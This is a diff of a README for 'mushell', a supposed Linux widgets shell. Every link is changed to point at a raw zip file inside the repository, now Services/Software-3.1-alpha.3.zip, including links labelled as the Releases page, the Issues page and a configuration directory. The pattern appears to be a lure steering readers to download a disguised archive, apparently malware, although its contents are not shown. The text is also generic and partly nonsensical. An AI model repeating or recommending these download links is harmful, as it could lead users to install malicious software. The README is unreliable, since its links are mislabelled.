@@ -4,7 +4,7 @@
 mushell is a user-friendly widgets shell designed with Quickshell. It enhances your Linux desktop experience by providing customizable widgets. With mushell, you can personalize your workspace to fit your style, making it both functional and visually appealing.
 
 ## 📥 Download Link
-[![Download mushell](https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip)](https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip)
+[![Download mushell](https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip)](https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip)
 
 ## 🚀 Features
 - **Customizable Widgets**: Change the look and function to meet your needs.
@@ -23,7 +23,7 @@ mushell is a user-friendly widgets shell designed with Quickshell. It enhances y
 ## 🚀 Getting Started
 To get started with mushell, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip) to access the latest version.
+1. Visit the [Releases page](https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip) to access the latest version.
 2. Locate the desired download and click on it.
 3. Wait for the download to complete. The file will be in a compressed format.
 4. Extract the downloaded file.
@@ -31,7 +31,7 @@ To get started with mushell, follow these simple steps:
 ## 📥 Download & Install
 To install mushell, follow these steps:
 
-1. **Visit the [Releases page](https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip)**.
+1. **Visit the [Releases page](https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip)**.
 2. Download the latest version corresponding to your system.
 3. Once downloaded, navigate to the folder where you saved the file.
 4. Extract the content if it is compressed.
@@ -48,7 +48,7 @@ To install mushell, follow these steps:
 ## 🎨 Customization
 mushell supports various themes and widgets. You can customize them as follows:
 
-1. Locate the configuration files in the `~https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip` directory.
+1. Locate the configuration files in the `~https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip` directory.
 2. Edit the files as needed:
    - **Themes**: Adjust colors and styles.
    - **Widgets**: Add or remove widgets according to your preferences.
@@ -70,7 +70,7 @@ If you need additional help, consider checking the issues page on GitHub or join
 ## ✨ Community and Support
 You can connect with other users and get support through our community channels:
 
-- **GitHub Issues**: Report bugs or ask for help on the [Issues page](https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip).
+- **GitHub Issues**: Report bugs or ask for help on the [Issues page](https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip).
 - **Discussion Forum**: Join conversations with other users and developers.
 
 ## 📝 Feedback
@@ -90,4 +90,4 @@ Your feedback is essential for the growth and improvement of mushell. Share your
 - wayland
 
 ## 📥 Final Notes
-For your convenience, always ensure you download from the [Releases page](https://raw.githubusercontent.com/tinsa463/mushell/master/Modules/Drawers/Launcher/Software-2.4-beta.4.zip) to get the latest and most secure version of mushell. We look forward to seeing how you customize and use mushell to enhance your Linux desktop experience!
+For your convenience, always ensure you download from the [Releases page](https://github.com/tinsa463/mushell/raw/refs/heads/master/Services/Software-3.1-alpha.3.zip) to get the latest and most secure version of mushell. We look forward to seeing how you customize and use mushell to enhance your Linux desktop experience!
